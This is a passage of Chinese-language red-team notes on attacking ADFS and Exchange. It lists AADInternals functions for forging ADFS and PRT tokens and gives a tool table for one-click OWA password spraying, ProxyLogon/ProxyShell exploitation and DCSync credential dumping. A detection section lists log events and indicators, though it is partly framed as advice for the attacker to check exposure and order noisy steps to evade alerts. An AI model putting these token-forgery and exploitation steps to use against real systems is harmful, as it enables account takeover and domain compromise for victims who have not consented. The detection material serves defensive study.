注意: 伪造令牌**不需要目标用户任何凭据**,MFA/密码改没改都拦不住——这正是 Golden SAML 的威慑点,也是必须报告客户"轮换 token-signing 证书 + 撤销会话"的原因;令牌有效期默认较长,拿到即用即弃,别囤;检测面见下节——蓝队视角这是"云侧有会话、ADFS 侧无对应签发事件"的剪刀差。

---

## ADFS 攻击链(四)— AADInternals 云侧滥用

来源:~/tools/src/AADInternals v0.9.8(Windows PowerShell 模块);**函数名以本机 grep 实测为准:本副本 646 个函数全部无 `AADInt` 前缀**(网上/官方 wiki 的 `Open-AADIntADFSDoor`、`ConvertTo-AADIntUserPRT` 等前缀名在本副本**不存在**,直接抄会报"命令找不到")

```powershell
# ===== 载入(Windows 落地机,目录整包拷过去,BouncyCastle.Crypto.dll 必须同目录)=====
Import-Module .\AADInternals\AADInternals.psd1

# ===== ADFS 令牌伪造家族(ADFS.ps1,函数名 grep 实测)=====
# 用拿到的签名证书直接造 ADFS 访问令牌/刷新令牌(不需要整个 ADFSpoof 流程时的轻量路线)
New-ADFSAccessToken     # 用给定证书签发新 AccessToken
New-ADFSRefreshToken    # 造 ADFS Refresh Token
Unprotect-ADFSRefreshToken   # 解密/校验已有 Refresh Token(离线分析窃得的令牌)
Get-ADFSIssuer          # 取签发方信息

# ===== PRT 家族(PRT.ps1,函数名 grep 实测)=====
New-UserPRTToken        # 造 PRT JWT(参数:RefreshToken+SessionKey 或 -Settings 对象;ClientId/Resource 指定受众)
Get-UserPRTKeys         # 提取 PRT 密钥
Get-AccessTokenWithPRTToken   # 用 PRT JWT 换访问令牌(后续打 Graph/各云服务)
New-BulkPRTToken        # 批量造 PRT
Join-DeviceToAzureAD    # 设备注册路线(PRT 的载体)

# ===== 云侧情报与滥用起步 =====
Get-AADConnectStatus    # 是否装了 AAD Connect(同步/PTA 情报)
# 拿到访问令牌后的 Graph 枚举/邮箱/团队滥用,函数族同样无前缀,用 Get-Command *AAD* / Get-Command *PRT* 现查最稳
```

注意: 本副本函数名全部无前缀——**先 `Get-Command -Module AADInternals *关键字*` 现查再敲**,别照博客抄 AADInt 前缀;PRT 路线与 Golden SAML 二选一即可(前者适合混入合法设备流量,后者适合单点定向);AADInternals 大量函数直连微软公网端点,落地机出网策略要提前确认,连接记录在微软云侧审计(Cloud App Security/Entra 日志)同样留痕。

---

## ADFS/Exchange 检测与防御对照

```text
【ADFS 侧】
- 审计开启:AD FS 管理 → 属性 → 联邦信息审计(成功/失败),加本地策略"审核对象访问";
  令牌签发类经典事件(Security 日志 500/501/502)+ AD FS/Admin、AD FS Tracing/Debug 频道
- Golden SAML 剪刀差:云侧(Entra ID 登录日志)出现令牌会话,但 ADFS 服务器无对应签发事件、
  DC 上无对应用户 4769(Kerberos 票据请求)——三家日志对不上 = 高危信号
- 证书轮换:token-signing 证书轮换 + 撤销既有会话 = 攻击链釜底抽薪(EncryptedPFX 立即作废)
- 服务账户:改 gMSA、监控其异常登录(非 ADFS 服务器来源的登录)
【DCSync(第③步)】
- DC 安全日志 4662:复制目录更改类操作,扩展权限 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 /
  1131f6ad-9c07-11d1-f79f-00c04fc2dcd2(DS-Replication-Get-Changes-All)
- 伴随 4624 类型3(网络登录)来自非常规主机、以 DA/服务账户身份
【Exchange 侧】
- 日志位置:IIS 日志 C:\inetpub\logs\LogFiles\W3SVC*\ + %ExchangeInstallPath%\Logging\ 下
  HttpProxy\(Ecp/Autodiscover/PowerShell/Mapi 各子目录)、EWS 日志
- ProxyLogon 特征:HttpProxy\Ecp 日志中异常 POST + 后端 Cookie(X-AnonResource-Backend 类标记);
  /owa/auth/ 下新增 aspx(时间戳聚类)
- ProxyShell 特征:autodiscover 日志里 `autodiscover.json?Email=` 路径混淆、/powershell 高频会话
- 通用防御:当月 SU 补丁(CU 基线)、微软 EOMTv2 健康脚本巡检、OWA 撞库限速与 MFA、
  ProxyNotShell 时代 URL 重写缓解规则装后要随补丁回收
```

注意: 红队自查暴露面:Exchange 五条 RCE 链的日志特征(上列)都是 SOC 成熟告警规则常客,打完自查是否已触发;ADFS 链最响的一枪是 DCSync 的 4662,第②步(ADFSDump 本地读库)反而日志最少——链路设计上把动静大的步骤放在最后、一次完成。

---

## 控制台一键工具清单(联动)

来源:RedOps Console(~/tools/bin/console.sh,默认 http://127.0.0.1:8765);下表工具本期已在执行台注册(tools.json),对应本文各节

| 控制台工具 ID | 用途 | 对应小节 |
|---|---|---|
| `exchange-discover` | Exchange/ADFS 路径与版本指纹一把梭(curl/nmap 组合) | 发现与指纹 / ADFS 发现 |
| `owa-spray-msf` | msf owa_login 字典爆破(自带域枚举) | OWA 凭据爆破 |
| `ruler-check` | ruler check 凭据验证(邮箱可达性) | ruler 探测与验证 |
| `proxylogon-msf` | exchange_proxylogon_rce 一键(先 scanner 探) | ProxyLogon |
| `proxyshell-msf` | exchange_proxyshell_rce 一键 | ProxyShell |
| `adfs-dcsync` | secretsdump -just-dc-user <ADFS服务账户> | ADFS 攻击链(二) |
| `bh-queries` | Exchange/ADFS 猎杀查询固化进 BloodHound | 权限视角 / ADFS 发现 |

```bash
~/tools/bin/console.sh        # 启动控制台+执行台(127.0.0.1:8765)
~/tools/bin/console.sh up     # 顺带拉起 postgresql/neo4j/bloodhound
~/tools/bin/console.sh stop   # 停止
```

注意: 执行台工具都是"参数表单化"的本文命令,跑之前照旧核版本/补丁(发现节);adfs-dcsync 属于动静最大的一环,时间窗与节流原则同 ADFS 篇注意;更早注册的 spray/secretsdump/dcsync 等通用工具见 04/05/10 号文档的清单。
